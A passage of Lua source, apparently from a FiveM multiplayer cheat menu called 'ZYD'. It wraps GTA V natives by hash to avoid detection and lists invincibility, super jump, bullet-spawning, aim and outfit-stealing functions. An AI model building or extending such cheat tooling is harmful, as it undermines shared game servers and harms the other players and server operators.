            hash = 0xE2587F8CBBD87B1D,
            unpack = function(...)
                local args = (...)

                return args[1], args[2], dict.Citizen.ReturnResultAnyway()
            end
        },
        ["IsDisabledControlReleased"] = {
            hash = 0xFB6C4072E9A32E92,
            unpack = function(...)
                local args = (...)

                return args[1], args[2], dict.Citizen.ReturnResultAnyway()
            end
        },
        ["IsControlJustPressed"] = {
            hash = 0x580417101DDB492F,
            unpack = function(...)
                local args = (...)

                return args[1], args[2], dict.Citizen.ReturnResultAnyway()
            end
        },
        ["IsControlJustReleased"] = {
            hash = 0x50F940259D3841E6,
            unpack = function(...)
                local args = (...)

                return args[1], args[2], dict.Citizen.ReturnResultAnyway()
            end
        },
        ["IsControlPressed"] = {
            hash = 0xF3A21BCD95725A4A,
            unpack = function(...)
                local args = (...)

                return args[1], args[2], dict.Citizen.ReturnResultAnyway()
            end
        },
        ["IsControlReleased"] = {
            hash = 0x648EE3E7F38877DD,
            unpack = function(...)
                local args = (...)

                return args[1], args[2], dict.Citizen.ReturnResultAnyway()
            end
        },
        ["ClearPedTasks"] = {
            hash = 0xE1EF3C1216AFF2CD
        },
        ["ClearPedTasksImmediately"] = {
            hash = 0xAAA34F8A7CB32098
        },
        ["ClearPedSecondaryTask"] = {
            hash = 0x176CECF6F920D707
        },
        ["SetEntityProofs"] = {
            hash = 0xFAEE099C6F890BB8
        },
        ["SetCamActive"] = {
            hash = 0x026FB97D0A425F84
        },
        ["RenderScriptCams"] = {
            hash = 0x07E5B515DB0636FC,
            unpack = function(...)
                local args = (...)

                return args[1], args[2], args[3], args[4], args[5]
            end
        },
        ["GetEntityForwardVector"] = {
            hash = 0x0A794A5A57F8DF91,
            unpack = function(...)
                local args = (...)

                return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsVector()
            end
        },
        ["RequestAnimDict"] = {
            hash = 0xD3BD40951412FEF6
        },
        ["SetTextScale"] = {
            hash = 0x07C837F9A01C34C9
        },
        ["SetTextColour"] = {
            hash = 0xBE6B23FFA53FB442
        },
        ["SetTextDropShadow"] = {
            hash = 0x465C84BC39F1C351
        },
        ["SetTextEdge"] = {
            hash = 0x441603240D202FA6
        },
        ["SetTextOutline"] = {
            hash = 0x2513DFB0FB8400FE
        },
        ["ClearPedBloodDamage"] = {
            hash = 0x8FE22675A5A45817
        },
        ["SetEntityHealth"] = {
            hash = 0x6B76DC1F3AE6E6A3
        },
        ["NetworkResurrectLocalPlayer"] = {
            hash = 0xEA23C49EAA83ACFB
        },
        ["SetTextCentre"] = {
            hash = 0xC02F4DBFB51D988B
        },
        ["BeginTextCommandDisplayText"] = {
            hash = 0x25FBB336DF1804CB
        },
        ["BeginTextCommandWidth"] = {
            hash = 0x54CE8AC98E120CAB
        },
        ["EndTextCommandGetWidth"] = {
            hash = 0x85F061DA64ED2F67,
            unpack = function(...)
                local args = (...)

                return args[1], dict.Citizen.ResultAsFloat()
            end
        },
        ["GetTextScaleHeight"] = {
            hash = 0xDB88A37483346780,
            unpack = function(...)
                local args = (...)

                return args[1], args[2], dict.Citizen.ResultAsFloat()
            end
        },
        ["DrawSprite"] = {
            hash = 0xE7FFAE5EBF23D890
        },
        ["FreezeEntityPosition"] = {
            hash = 0x428CA6DBD1094446
        },
        ["GetPedBoneIndex"] = {
            hash = 0x3F428D08BE5AAE31,
            unpack = function(...)
                local args = (...)

                return args[1], args[2], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
            end
        },
        ["GetPedBoneCoords"] = {
            hash = 0x17C07FC640E86B4E,
            unpack = function(...)
                local args = (...)

                return args[1], args[2], args[3], args[4], args[5], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsVector()
            end
        },
        ["SetPedShootsAtCoord"] = {
            hash = 0x96A05E4FB321B1BA
        },
        ["GetEntityBoneIndexByName"] = {
            hash = 0xFB71170B7E76ACBA,
            unpack = function(...)
                local args = (...)

                return args[1], dict.tostring(args[2]), dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
            end
        },
        ["GetOffsetFromEntityInWorldCoords"] = {
            hash = 0x1899F328B0E12848,
            unpack = function(...)
                local args = (...)
                local x, y, z

                if dict.type(args[2]) == "table" or dict.type(args[2]) == "vector" then
                    x = args[2].x
                    y = args[2].y
                    z = args[2].z
                else
                    x = args[2]
                    y = args[3]
                    z = args[4]
                end

                return args[1], x, y, z, dict.Citizen.ResultAsVector()
            end
        },
        ["AddTextComponentSubstringPlayerName"] = {
            hash = 0x6C188BE134E074AA
        },
        ["EndTextCommandDisplayText"] = {
            hash = 0xCD015E5BB0D96A57
        },
        ["IsPedInAnyVehicle"] = {
            hash = 0x997ABD671D25CA0B
        },
        ["GetEntityHeading"] = {
            hash = 0xE83D4F9BA2A38914,
            unpack = function(...)
                local args = (...)

                return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsFloat()
            end
        },
        ["AddBlipForCoord"] = {
            hash = 0x5A039BB0BCA604B6
        },
        ["SetBlipSprite"] = {
            hash = 0xDF735600A4696DAF
        },
        ["SetBlipColour"] = {
            hash = 0x03D7FB09E75D6B7E
        },
        ["SetBlipScale"] = {
            hash = 0xD38744167B2FA257
        },
        ["SetBlipCoords"] = {
            hash = 0xAE2AF67E9D9AF65D
        },
        ["SetBlipRotation"] = {
            hash = 0xF87683CDF73C3F6E
        },
        ["ShowHeadingIndicatorOnBlip"] = {
            hash = 0x5FBCA48327B914DF
        },
        ["SetBlipCategory"] = {
            hash = 0x234CDD44D996FD9A
        },
        ["BeginTextCommandSetBlipName"] = {
            hash = 0xF9113A30DE5C6670
        },
        ["GetPlayerName"] = {
            hash = 0x6D0DE6A7B5DA71F8,
            unpack = function(...)
                local args = (...)

                return args[1], dict.Citizen.ResultAsString()
            end
        },
        ["EndTextCommandSetBlipName"] = {
            hash = 0xBC38B49BCB83BC9B
        },
        ["DrawRect"] = {
            hash = 0x3A618A217E5154F0
        },
        ["IsEntityInAir"] = {
            hash = 0x886E37EC497200B6
        },
        ["DisableAllControlActions"] = {
            hash = 0x5F4B6931816E599B
        },
        ["TaskWanderStandard"] = {
            hash = 0xBB9CE077274F6A1B
        },
        ["TaskWarpPedIntoVehicle"] = {
            hash = 0x9A7D091411C5F684
        },
        ["SetMouseCursorActiveThisFrame"] = {
            hash = 0xAAE7CE1D63167423
        },
        ["SetMouseCursorSprite"] = {
            hash = 0x8DB8CFFD58B62552
        },
        ["GiveDelayedWeaponToPed"] = {
            hash = 0xB282DC6EBD803C75
        },
        ["ApplyForceToEntity"] = {
            hash = 0xC5F68BE9613E2D18
        },
        ["GetScreenCoordFromWorldCoord"] = {
            hash = 0x34E82F05DF2974F5,
            unpack = function(...)
                local args = (...)
                local x, y, z

                if dict.type(args[1]) == "table" or dict.type(args[1]) == "vector" then
                    x = args[1].x
                    y = args[1].y
                    z = args[1].z
                else
                    x = args[1]
                    y = args[2]
                    z = args[3]
                end

                return x, y, z, dict.Citizen.PointerValueFloat(), dict.Citizen.PointerValueFloat(), dict.Citizen.ReturnResultAnyway()
            end
        },
        ["NetworkIsPlayerTalking"] = {
            hash = 0x031E11F3D447647E,
            unpack = function(...)
                local args = (...)

                return args[1], dict.Citizen.ReturnResultAnyway()
            end
        },
        ["SetDrawOrigin"] = {
            hash = 0xAA0008F3BBB8F416
        },
        ["ClearDrawOrigin"] = {
            hash = 0xFF0B610F6BE0D7AF
        },
        ["GetRenderingCam"] = {
            hash = 0x5234F9F10919EABA,
            unpack = function() return dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger() end
        },
        ["GetGameplayCamCoord"] = {
            hash = 0x14D6F5678D8F1B37,
            unpack = function() return dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsVector() end
        },
        ["GetFinalRenderedCamCoord"] = {
            hash = 0xA200EB1EE790F448,
            unpack = function() return dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsVector() end
        },
        ["GetGameplayCamFov"] = {
            hash = 0x65019750A0324133,
            unpack = function() return dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsFloat() end
        },
        ["ObjToNet"] = {
            hash = 0x99BFDC94A603E541,
            unpack = function(...)
                local args = (...)

                return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
            end
        },
        ["StatSetInt"] = {
            hash = 0xB3271D7AB655B441,
            unpack = function(...)
                local args = (...)

                return dict.type(args[1]) == "string" and ZYD:GetFunction("GetHashKey")(args[1]) or args[1], args[2], args[3], dict.Citizen.ReturnResultAnyway()
            end
        },
        ["NetworkSetNetworkIdDynamic"] = {
            hash = 0x2B1813ABA29016C5
        },
        ["SetNetworkIdExistsOnAllMachines"] = {
            hash = 0xE05E81A888FA63C8
        },
        ["GetDistanceBetweenCoords"] = {
            hash = 0xF1B760881820C952,
            unpack = function(...)
                local args = (...)

                return args[1], args[2], args[3], args[4], args[5], args[6], args[7], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsFloat()
            end
        },
        ["SetEntityHeading"] = {
            hash = 0x8E2530AA8ADA980E
        },
        ["HasScaleformMovieLoaded"] = {
            hash = 0x85F01B8D5B90570E,
            unpack = function(...)
                local args = (...)

                return args[1], dict.Citizen.ReturnResultAnyway()
            end
        },
        ["RequestScaleformMovie"] = {
            hash = 0x11FE353CF9733E6F,
            unpack = function(...)
                local args = (...)

                return dict.tostring(args[1]), dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
            end
        },
        ["BeginScaleformMovieMethod"] = {
            hash = 0xF6E48914C7A8694E
        },
        ["EndScaleformMovieMethodReturnValue"] = {
            hash = 0xC50AA39A577AF886,
            unpack = function() return dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger() end
        },
        ["ScaleformMovieMethodAddParamInt"] = {
            hash = 0xC3D0841A0CC546A6
        },
        ["ScaleformMovieMethodAddParamTextureNameString"] = {
            hash = 0xBA7148484BD90365
        },
        ["DisableControlAction"] = {
            hash = 0xFE99B66D079CF6BC
        },
        ["PlayerId"] = {
            hash = 0x4F8644AF03D0E0D6,
            unpack = function() return dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger() end
        },
        ["ShootSingleBulletBetweenCoords"] = {
            hash = 0x867654CBC7606F2C,
            unpack = function(...)
                local args = (...)

                return args[1], args[2], args[3], args[4], args[5], args[6], args[7], args[8], dict.type(args[9]) == "string" and ZYD:GetFunction("GetHashKey")(args[9]) or args[9], args[10], args[11], args[12], args[13]
            end
        },
        ["ClearAreaOfProjectiles"] = {
            hash = 0x0A1CB9094635D1A6
        },
        ["GetPedLastWeaponImpactCoord"] = {
            hash = 0x6C4D0409BA1A2BC2,
            unpack = function(...)
                local args = (...)

                return args[1], dict.Citizen.PointerValueVector(), dict.Citizen.ReturnResultAnyway()
            end
        },
        ["SetExplosiveMeleeThisFrame"] = {
            hash = 0xFF1BED81BFDC0FE0
        },
        ["GetCurrentPedWeaponEntityIndex"] = {
            hash = 0x3B390A939AF0B5FC,
            unpack = function(...)
                local args = (...)

                return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
            end
        },
        ["GetSelectedPedWeapon"] = {
            hash = 0x0A6DB4965674D243,
            unpack = function(...)
                local args = (...)

                return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
            end
        },
        ["PedSkipNextReloading"] = {
            hash = 0x8C0D57EA686FAD87
        },
        ["GetMaxAmmoInClip"] = {
            hash = 0xA38DCFFCEA8962FA,
            unpack = function(...)
                local args = (...)

                return args[1], dict.type(args[2]) == "string" and ZYD:GetFunction("GetHashKey")(args[2]) or args[2], args[3], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
            end
        },
        ["GetAmmoInClip"] = {
            hash = 0x2E1202248937775C,
            unpack = function(...)
                local args = (...)

                return args[1], dict.type(args[2]) == "string" and ZYD:GetFunction("GetHashKey")(args[2]) or args[2], dict.Citizen.PointerValueIntInitialized(args[3]), dict.Citizen.ReturnResultAnyway()
            end
        },
        ["IsPlayerFreeAiming"] = {
            hash = 0x2E397FD2ECD37C87,
            unpack = function(...)
                local args = (...)

                return args[1], dict.Citizen.ReturnResultAnyway()
            end
        },
        ["IsPedDoingDriveby"] = {
            hash = 0xB2C086CC1BF8F2BF,
            unpack = function(...)
                local args = (...)

                return args[1], dict.Citizen.ReturnResultAnyway()
            end
        },
        ["GetEntityPlayerIsFreeAimingAt"] = {
            hash = 0x2975C866E6713290,
            unpack = function(...)
                local args = (...)

                return args[1], dict.Citizen.PointerValueIntInitialized(args[2]), dict.Citizen.ReturnResultAnyway()
            end
        },
        ["IsPlayerFreeAimingAtEntity"] = {
            hash = 0x3C06B5C839B38F7B,
            unpack = function(...)
                local args = (...)

                return args[1], args[2], dict.Citizen.ReturnResultAnyway()
            end
        },
        ["DisablePlayerFiring"] = {
            hash = 0x5E6CC07646BBEAB8
        },
        ["SetFocusPosAndVel"] = {
            hash = 0xBB7454BAFF08FE25
        },
        ["SetCamCoord"] = {
            hash = 0x4D41783FB745E42E
        },
        ["SetCamActive"] = {
            hash = 0x026FB97D0A425F84
        },
        ["SetCamFov"] = {
            hash = 0xB13C14F66A00D047
        },
        ["SetCamRot"] = {
            hash = 0x85973643155D0B07
        },
        ["SetCamShakeAmplitude"] = {
            hash = 0xD93DB43B82BC0D00
        },
        ["UpdateOnscreenKeyboard"] = {
            hash = 0x0CF2B696BBF945AE,
            unpack = function() return dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger() end
        },
        ["CancelOnscreenKeyboard"] = {
            hash = 0x58A39BE597CE99CD
        },
        ["SetVehicleFixed"] = {
            hash = 0x115722B1B9C14C1C
        },
        ["SetVehicleDirtLevel"] = {
            hash = 0x79D3B596FE44EE8B
        },
        ["SetVehicleLights"] = {
            hash = 0x34E710FF01247C5A
        },
        ["SetVehicleBurnout"] = {
            hash = 0xFB8794444A7D60FB
        },
        ["SetVehicleLightsMode"] = {
            hash = 0x1FD09E7390A74D54
        },
        ["GetCamMatrix"] = {
            hash = 0x8f57a89d,
            unpack = function(...)
                local args = (...)

                return args[1], dict.Citizen.PointerValueVector(), dict.Citizen.PointerValueVector(), dict.Citizen.PointerValueVector(), dict.Citizen.PointerValueVector()
            end
        },
        ["DoesEntityHaveDrawable"] = {
            hash = 0x060D6E96F8B8E48D,
            unpack = function(...)
                local args = (...)

                return args[1], dict.Citizen.ReturnResultAnyway()
            end
        },
        ["IsEntityAnObject"] = {
            hash = 0x8D68C8FD0FACA94E,
            unpack = function(...)
                local args = (...)

                return args[1], dict.Citizen.ReturnResultAnyway()
            end
        },
        ["IsEntityAVehicle"] = {
            hash = 0x6AC7003FA6E5575E,
            unpack = function(...)
                local args = (...)

                return args[1], dict.Citizen.ReturnResultAnyway()
            end
        },
        ["SetNewWaypoint"] = {
            hash = 0xFE43368D2AA4F2FC
        },
        ["HasEntityClearLosToEntityInFront"] = {
            hash = 0x0267D00AF114F17A,
            unpack = function(...)
                local args = (...)

                return args[1], args[2], dict.Citizen.ReturnResultAnyway()
            end
        },
        ["HasEntityClearLosToEntity"] = {
            hash = 0xFCDFF7B72D23A1AC,
            unpack = function(...)
                local args = (...)

                return args[1], args[2], dict.Citizen.ReturnResultAnyway()
            end
        },
        ["IsEntityAPed"] = {
            hash = 0x524AC5ECEA15343E,
            unpack = function(...)
                local args = (...)

                return args[1], dict.Citizen.ReturnResultAnyway()
            end
        },
        ["GetControlInstructionalButton"] = {
            hash = 0x0499D7B09FC9B407,
            unpack = function(...)
                local args = (...)

                return args[1], args[2], args[3], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsString()
            end
        },
        ["DrawScaleformMovie"] = {
            hash = 0x54972ADAF0294A93
        },
        ["SetFocusEntity"] = {
            hash = 0x198F77705FA0931D
        },
        ["DrawLine"] = {
            hash = 0x6B7256074AE34680
        },
        ["DrawPoly"] = {
            hash = 0xAC26716048436851
        },
        ["GetEntityRotation"] = {
            hash = 0xAFBD61CC738D9EB9,
            unpack = function(...)
                local args = (...)

                return args[1], args[2], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsVector()
            end
        },
        ["TaskPlayAnim"] = {
            hash = 0xEA47FE3719165B94
        },
        ["TaskVehicleTempAction"] = {
            hash = 0xC429DCEEB339E129
        },
        ["AttachEntityToEntity"] = {
            hash = 0x6B9BBD38AB0796DF
        },
        ["SetRunSprintMultiplierForPlayer"] = {
            hash = 0x6DB47AA77FD94E09
        },
        ["SetSuperJumpThisFrame"] = {
            hash = 0x57FFF03E423A4C0B
        },
        ["SetPedMoveRateOverride"] = {
            hash = 0x085BF80FA50A39D1
        },
        ["DisplayOnscreenKeyboard"] = {
            hash = 0x00DC833F2568DBF6
        },
        ["GetOnscreenKeyboardResult"] = {
            hash = 0x8362B09B91893647,
            unpack = function() return dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsString() end
        },
        ["SetEntityVisible"] = {
            hash = 0xEA1C610A04DB6BBB
        },
        ["SetEntityInvincible"] = {
            hash = 0x3882114BDE571AD4
        },
        ["TaskSetBlockingOfNonTemporaryEvents"] = {
            hash = 0x90D2156198831D69
        },
        ["GiveWeaponToPed"] = {
            hash = 0xBF0FD6E56C964FCB
        },
        ["SetPedAccuracy"] = {
            hash = 0x7AEFB85C1D49DEB6
        },
        ["SetPedAlertness"] = {
            hash = 0xDBA71115ED9941A6
        },
        ["TaskCombatPed"] = {
            hash = 0xF166E48407BAC484
        },
        ["SetPlayerModel"] = {
            hash = 0x00A1CADD00108836,
            unpack = function(...)
                local args = (...)

                return args[1], dict.type(args[2]) == "string" and ZYD:GetFunction("GetHashKey")(args[2]) or args[2]
            end
        },
        ["GetDisplayNameFromVehicleModel"] = {
            hash = 0xB215AAC32D25D019,
            unpack = function(...)
                local args = (...)

                return dict.type(args[1]) == "string" and ZYD:GetFunction("GetHashKey")(args[1]) or args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsString()
            end
        },
        ["SetPedRandomComponentVariation"] = {
            hash = 0xC8A9481A01E63C28
        },
        ["SetPedRandomProps"] = {
            hash = 0xC44AA05345C992C6
        },
        ["SetVehicleEngineOn"] = {
            hash = 0x2497C4717C8B881E
        },
        ["SetVehicleForwardSpeed"] = {
            hash = 0xAB54A438726D25D5
        },
        ["SetVehicleCurrentRpm"] = {
            hash = 0x2A01A8FC
        },
        ["IsModelValid"] = {
            hash = 0xC0296A2EDF545E92,
            unpack = function(...)
                local args = (...)

                return dict.type(args[1]) == "string" and ZYD:GetFunction("GetHashKey")(args[1]) or args[1], dict.Citizen.ReturnResultAnyway()
            end
        },
        ["IsModelAVehicle"] = {
            hash = 0x19AAC8F07BFEC53E,
            unpack = function(...)
                local args = (...)

                return dict.type(args[1]) == "string" and ZYD:GetFunction("GetHashKey")(args[1]) or args[1], dict.Citizen.ReturnResultAnyway()
            end
        },
        ["IsPedWeaponReadyToShoot"] = {
            hash = 0xB80CA294F2F26749,
            unpack = function(...)
                local args = (...)

                return args[1], dict.Citizen.ReturnResultAnyway()
            end
        },
        ["SetPedComponentVariation"] = {
            hash = 0x262B14F48D29DE80
        },
        ["GetEntityHealth"] = {
            hash = 0xEEF059FAD016D209,
            unpack = function(...)
                local args = (...)

                return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
            end
        },
        ["GetAmmoInPedWeapon"] = {
            hash = 0x015A522136D7F951,
            unpack = function(...)
                local args = (...)

                return args[1], dict.type(args[2]) == "string" and ZYD:GetFunction("GetHashKey")(args[2]) or args[2], args[3], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
            end
        },
        ["GetMaxAmmo"] = {
            hash = 0xDC16122C7A20C933,
            unpack = function(...)
                local args = (...)

                return args[1], dict.type(args[2]) == "string" and ZYD:GetFunction("GetHashKey")(args[2]) or args[2], dict.Citizen.PointerValueIntInitialized(args[3]), dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
            end
        },
        ["GetAmmoInPedWeapon"] = {
            hash = 0x015A522136D7F951,
            unpack = function(...)
                local args = (...)

                return args[1], dict.type(args[2]) == "string" and ZYD:GetFunction("GetHashKey")(args[2]) or args[2], args[3], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
            end
        },
        ["GetPedPropIndex"] = {
            hash = 0x898CC20EA75BACD8,
            unpack = function(...)
                local args = (...)

                return args[1], args[2], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
            end
        },
        ["GetPedPropTextureIndex"] = {
            hash = 0xE131A28626F81AB2,
            unpack = function(...)
                local args = (...)

                return args[1], args[2], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
            end
        },
        ["GetPedDrawableVariation"] = {
            hash = 0x67F3780DD425D4FC,
            unpack = function(...)
                local args = (...)

                return args[1], args[2], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
            end
        },
        ["GetPedTextureVariation"] = {
            hash = 0x04A355E041E004E6,
            unpack = function(...)
                local args = (...)

                return args[1], args[2], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
            end
        },
        ["GetPedPaletteVariation"] = {
            hash = 0xE3DD5F2A84B42281,
            unpack = function(...)
                local args = (...)

                return args[1], args[2], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
            end
        },
        ["SetPedPropIndex"] = {
            hash = 0x93376B65A266EB5F
        },
        ["SetPedAmmo"] = {
            hash = 0x14E56BC5B5DB6A19
        },
        ["SetAmmoInClip"] = {
            hash = 0xDCD2A934D65CB497,
            unpack = function(...)
                local args = (...)

                return args[1], dict.type(args[2]) == "string" and ZYD:GetFunction("GetHashKey")(args[2]) or args[2], args[3], dict.Citizen.ReturnResultAnyway()
            end
        },
        ["GetDisabledControlNormal"] = {
            hash = 0x11E65974A982637C,
            unpack = function(...)
                local args = (...)

                return args[1], args[2], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsFloat()
            end
        },
        ["TaskLookAtEntity"] = {
            hash = 0x69F4BE8C8CC4796C
        },
        ["PointCamAtEntity"] = {
            hash = 0x5640BFF86B16E8DC
        }
    }

    local _bad = {}
    local _empty = function() end

    local bad = function(...)
        if not _bad[dict.tostring(...)] then
            ZYD:Print("[NATIVE] Invalid GetFunction call: ^1" .. dict.tostring(...) .. "^7")
            _bad[dict.tostring(...)] = true
        end

        return _empty
    end

    function ZYD:GetFunction(name)
        if not _natives[name] then return bad(name) end

        if _natives[name].func then
            return _natives[name].func
        elseif _natives[name].hash then
            _natives[name].func = function(...)
                local args = {...}
                local data = _natives[name]
                local hash = data.hash

                if data.unpack then
                    if data.return_as then return data.return_as(dict.Citizen.IN(hash, data.unpack(args))) end

                    return dict.Citizen.IN(hash, data.unpack(args))
                else
                    if data.return_as then return data.return_as(dict.Citizen.IN(hash, table.unpack(args))) end

                    return dict.Citizen.IN(hash, table.unpack(args))
                end
            end

            return _natives[name].func
        end
    end

    ZYD.Keys = {
        ["ESC"] = 322,
        ["F1"] = 288,
        ["F2"] = 289,
        ["F3"] = 170,
        ["F5"] = 166,
        ["F6"] = 167,
        ["F7"] = 168,
        ["F8"] = 169,
        ["F9"] = 56,
        ["F10"] = 57,
        ["~"] = 243,
        ["1"] = 157,
        ["2"] = 158,
        ["3"] = 160,
        ["4"] = 164,
        ["5"] = 165,
        ["6"] = 159,
        ["7"] = 161,
        ["8"] = 162,
        ["9"] = 163,
        ["-"] = 84,
        ["="] = 83,
        ["BACKSPACE"] = 177,
        ["TAB"] = 37,
        ["Q"] = 44,
        ["W"] = 32,
        ["E"] = 38,
        ["R"] = 45,
        ["T"] = 245,
        ["Y"] = 246,
        ["U"] = 303,
        ["P"] = 199,
        ["["] = 39,
        ["]"] = 40,
        ["ENTER"] = 18,
        ["CAPS"] = 137,
        ["A"] = 34,
        ["S"] = 8,
        ["D"] = 9,
        ["F"] = 23,
        ["G"] = 47,
        ["H"] = 74,
        ["K"] = 311,
        ["L"] = 182,
        ["LEFTSHIFT"] = 21,
        ["Z"] = 20,
        ["X"] = 73,
        ["C"] = 26,
        ["V"] = 0,
        ["B"] = 29,
        ["N"] = 249,
        ["M"] = 244,
        [","] = 82,
        ["."] = 81,
        ["LEFTCTRL"] = 36,
        ["LEFTALT"] = 19,
        ["SPACE"] = 22,
        ["RIGHTCTRL"] = 70,
        ["HOME"] = 213,
        ["PAGEUP"] = 10,
        ["PAGEDOWN"] = 11,
        ["DELETE"] = 178,
        ["LEFT"] = 174,
        ["RIGHT"] = 175,
        ["UP"] = 172,
        ["DOWN"] = 173,
        ["NENTER"] = 201,
        ["MWHEELUP"] = 15,
        ["MWHEELDOWN"] = 14,
        ["N4"] = 108,
        ["N5"] = 60,
        ["N6"] = 107,
        ["N+"] = 96,
        ["N-"] = 97,
        ["N7"] = 117,
        ["N8"] = 61,
        ["N9"] = 118,
        ["MOUSE1"] = 24,
        ["MOUSE2"] = 25,
        ["MOUSE3"] = 348
    }

    local all_weapons = {"WEAPON_UNARMED", "WEAPON_KNIFE", "WEAPON_KNUCKLE", "WEAPON_NIGHTSTICK", "WEAPON_HAMMER", "WEAPON_BAT", "WEAPON_GOLFCLUB", "WEAPON_CROWBAR", "WEAPON_BOTTLE", "WEAPON_DAGGER", "WEAPON_HATCHET", "WEAPON_MACHETE", "WEAPON_FLASHLIGHT", "WEAPON_SWITCHBLADE", "WEAPON_PISTOL", "WEAPON_PISTOL_MK2", "WEAPON_COMBATPISTOL", "WEAPON_APPISTOL", "WEAPON_PISTOL50", "WEAPON_SNSPISTOL", "WEAPON_HEAVYPISTOL", "WEAPON_VINTAGEPISTOL", "WEAPON_STUNGUN", "WEAPON_FLAREGUN", "WEAPON_MARKSMANPISTOL", "WEAPON_REVOLVER", "WEAPON_MICROSMG", "WEAPON_SMG", "WEAPON_MINISMG", "WEAPON_SMG_MK2", "WEAPON_ASSAULTSMG", "WEAPON_MG", "WEAPON_COMBATMG", "WEAPON_COMBATMG_MK2", "WEAPON_COMBATPDW", "WEAPON_GUSENBERG", "WEAPON_MACHINEPISTOL", "WEAPON_ASSAULTRIFLE", "WEAPON_ASSAULTRIFLE_MK2", "WEAPON_CARBINERIFLE", "WEAPON_CARBINERIFLE_MK2", "WEAPON_ADVANCEDRIFLE", "WEAPON_SPECIALCARBINE", "WEAPON_BULLPUPRIFLE", "WEAPON_COMPACTRIFLE", "WEAPON_PUMPSHOTGUN", "WEAPON_SAWNOFFSHOTGUN", "WEAPON_BULLPUPSHOTGUN", "WEAPON_ASSAULTSHOTGUN", "WEAPON_MUSKET", "WEAPON_HEAVYSHOTGUN", "WEAPON_DBSHOTGUN", "WEAPON_SNIPERRIFLE", "WEAPON_HEAVYSNIPER", "WEAPON_HEAVYSNIPER_MK2", "WEAPON_MARKSMANRIFLE", "WEAPON_GRENADELAUNCHER", "WEAPON_GRENADELAUNCHER_SMOKE", "WEAPON_RPG", "WEAPON_STINGER", "WEAPON_FIREWORK", "WEAPON_HOMINGLAUNCHER", "WEAPON_GRENADE", "WEAPON_STICKYBOMB", "WEAPON_PROXMINE", "WEAPON_MINIGUN", "WEAPON_RAILGUN", "WEAPON_POOLCUE", "WEAPON_BZGAS", "WEAPON_SMOKEGRENADE", "WEAPON_MOLOTOV", "WEAPON_FIREEXTINGUISHER", "WEAPON_PETROLCAN", "WEAPON_SNOWBALL", "WEAPON_FLARE", "WEAPON_BALL"}
    ZYD.Notifications = {}

    local function _clamp(val, min, max)
        if val < min then return min end
        if val > max then return max end

        return val
    end

    function ZYD:EquipOutfit(data)
        local ped = ZYD:GetFunction("PlayerPedId")()
        ZYD:GetFunction("SetPlayerModel")(ZYD:GetFunction("PlayerId")(), data.model)
        ZYD:GetFunction("SetPedPropIndex")(ped, 0, data.hat, data.hat_texture, 1)
        ZYD:GetFunction("SetPedPropIndex")(ped, 1, data.glasses, data.glasses_texture, 1)
        ZYD:GetFunction("SetPedPropIndex")(ped, 2, data.ear, data.ear_texture, 1)
        ZYD:GetFunction("SetPedPropIndex")(ped, 6, data.watch, data.watch_texture, 1)
        ZYD:GetFunction("SetPedPropIndex")(ped, 7, data.wrist, data.wrist_texture, 1)
        ZYD:GetFunction("SetPedComponentVariation")(ped, 0, data.head.draw, data.head.texture, data.head.palette)
        ZYD:GetFunction("SetPedComponentVariation")(ped, 1, data.beard.draw, data.beard.texture, data.beard.palette)
        ZYD:GetFunction("SetPedComponentVariation")(ped, 2, data.hair.draw, data.hair.texture, data.hair.palette)
        ZYD:GetFunction("SetPedComponentVariation")(ped, 3, data.torso.draw, data.torso.texture, data.torso.palette)
        ZYD:GetFunction("SetPedComponentVariation")(ped, 4, data.legs.draw, data.legs.texture, data.legs.palette)
        ZYD:GetFunction("SetPedComponentVariation")(ped, 5, data.hands.draw, data.hands.texture, data.hands.palette)
        ZYD:GetFunction("SetPedComponentVariation")(ped, 6, data.feet.draw, data.feet.texture, data.feet.palette)
        ZYD:GetFunction("SetPedComponentVariation")(ped, 7, data.accessory_1.draw, data.accessory_1.texture, data.accessory_1.palette)
        ZYD:GetFunction("SetPedComponentVariation")(ped, 8, data.accessory_2.draw, data.accessory_2.texture, data.accessory_2.palette)
        ZYD:GetFunction("SetPedComponentVariation")(ped, 9, data.accessory_3.draw, data.accessory_3.texture, data.accessory_3.palette)
        ZYD:GetFunction("SetPedComponentVariation")(ped, 10, data.mask.draw, data.mask.texture, data.mask.palette)
        ZYD:GetFunction("SetPedComponentVariation")(ped, 11, data.auxillary.draw, data.auxillary.texture, data.auxillary.palette)
    end

    function ZYD:StealOutfit(player)
        local ped = ZYD:GetFunction("GetPlayerPed")(player)

